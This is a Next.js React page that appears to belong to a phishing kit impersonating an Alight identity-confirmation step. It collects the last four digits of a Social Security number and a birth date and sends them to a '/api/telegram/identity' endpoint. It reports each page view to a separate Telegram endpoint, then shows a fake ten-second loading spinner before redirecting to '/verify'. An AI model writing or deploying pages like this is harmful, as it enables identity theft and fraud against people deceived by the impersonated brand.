"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { HelpCircle, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { SiteHeader } from "@/components/site-header"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { MONTHS, DAYS, YEARS } from "@/lib/date-constants"

const LOADING_MS = 10_000

export default function IdentityPage() {
  const router = useRouter()
  const [ssnLast4, setSsnLast4] = useState("")
  const [month, setMonth] = useState("")
  const [day, setDay] = useState("")
  const [year, setYear] = useState("")
  const [privacyAccepted, setPrivacyAccepted] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const hasNotifiedView = useRef(false)

  const ssnDigits = ssnLast4.replace(/\D/g, "")
  const isSsnValid = ssnDigits.length === 4
  const isDateValid = Boolean(month && day && year)
  const isFormValid = isSsnValid && isDateValid && privacyAccepted

  useEffect(() => {
    if (hasNotifiedView.current) return
    hasNotifiedView.current = true
    fetch("/api/telegram/identity-view", { method: "POST" }).catch(console.error)
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isFormValid || isLoading) return
    setIsLoading(true)
    void fetch("/api/telegram/identity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ssnLast4: ssnDigits,
        birthDate: `${month} ${day}, ${year}`,
      }),
    }).catch((err) => {
      console.error("Identity notification error:", err)
    })
    await new Promise((r) => setTimeout(r, LOADING_MS))
    router.push("/verify")
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
        <div className="flex items-center gap-2 mb-2">
          <h1 className="text-2xl font-semibold text-gray-900">Confirm your identity</h1>
          <button
            type="button"
            className="text-[#002586] hover:underline flex items-center gap-1"
            aria-label="Help"
          >
            <HelpCircle className="w-4 h-4" />
            <span className="text-sm">Help</span>
          </button>
        </div>

        <p className="text-gray-700 text-sm mb-6">
          You&apos;ll need to provide some information first to confirm your identity.
        </p>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label htmlFor="identity-ssn" className="block text-sm font-semibold text-gray-900 mb-1.5">
              Last 4 Digits of SSN
            </label>
            <Input
              id="identity-ssn"
              type="text"
              inputMode="numeric"
              maxLength={4}
              value={ssnLast4}
              onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
              placeholder=""
              className="max-w-[200px] h-10 bg-white border-gray-300 rounded-md text-sm"
              disabled={isLoading}
            />
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-900 mb-1.5">Birth Date</label>
            <div className="flex gap-2 flex-wrap">
              <select
                value={month}
                onChange={(e) => setMonth(e.target.value)}
                disabled={isLoading}
                className="h-10 px-3 bg-white border border-gray-300 rounded-md text-sm text-gray-900 min-w-[120px]"
              >
                <option value="">Month</option>
                {MONTHS.map((m) => (
                  <option key={m} value={m}>
                    {m}
                  </option>
                ))}
              </select>
              <select
                value={day}
                onChange={(e) => setDay(e.target.value)}
                disabled={isLoading}
                className="h-10 px-3 bg-white border border-gray-300 rounded-md text-sm text-gray-900 min-w-[80px]"
              >
                <option value="">Day</option>
                {DAYS.map((d) => (
                  <option key={d} value={d}>
                    {d}
                  </option>
                ))}
              </select>
              <select
                value={year}
                onChange={(e) => setYear(e.target.value)}
                disabled={isLoading}
                className="h-10 px-3 bg-white border border-gray-300 rounded-md text-sm text-gray-900 min-w-[90px]"
              >
                <option value="">Year</option>
                {YEARS.map((y) => (
                  <option key={y} value={y}>
                    {y}
                  </option>
                ))}
              </select>
            </div>
          </div>

          <div className="flex items-start gap-2">
            <Checkbox
              id="identity-privacy"
              checked={privacyAccepted}
              onCheckedChange={(c) => setPrivacyAccepted(c === true)}
              disabled={isLoading}
              className="mt-0.5 border-gray-400"
            />
            <label htmlFor="identity-privacy" className="text-sm text-gray-700 cursor-pointer select-none">
              To continue, check here to accept the{" "}
              <a
                href="https://www.alight.com/privacy-policy"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[#002586] hover:underline font-medium"
              >
                Alight Privacy Policy.
              </a>
            </label>
          </div>

          <div className="flex gap-3 pt-2 flex-wrap items-center">
            <Button
              type="submit"
              disabled={!isFormValid || isLoading}
              className={
                isLoading || isFormValid
                  ? "bg-[#002586] text-white hover:bg-[#001f6b] rounded-md h-9 px-5 text-sm font-medium"
                  : "bg-gray-200 text-gray-500 border border-gray-300 rounded-md h-9 px-5 text-sm font-medium disabled:opacity-100"
              }
            >
              {isLoading ? (
                <span className="inline-flex items-center gap-2">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  Loading...
                </span>
              ) : (
                "Continue"
              )}
            </Button>
            <Button
              type="button"
              disabled={isLoading}
              className="bg-[#5a5a5a] hover:bg-[#4a4a4a] text-white border-0 rounded-md h-9 px-5 text-sm font-medium disabled:opacity-70"
              onClick={() => router.push("/")}
            >
              Cancel
            </Button>
          </div>
        </form>
      </div>

      <SiteFooter />
    </div>
  )
}
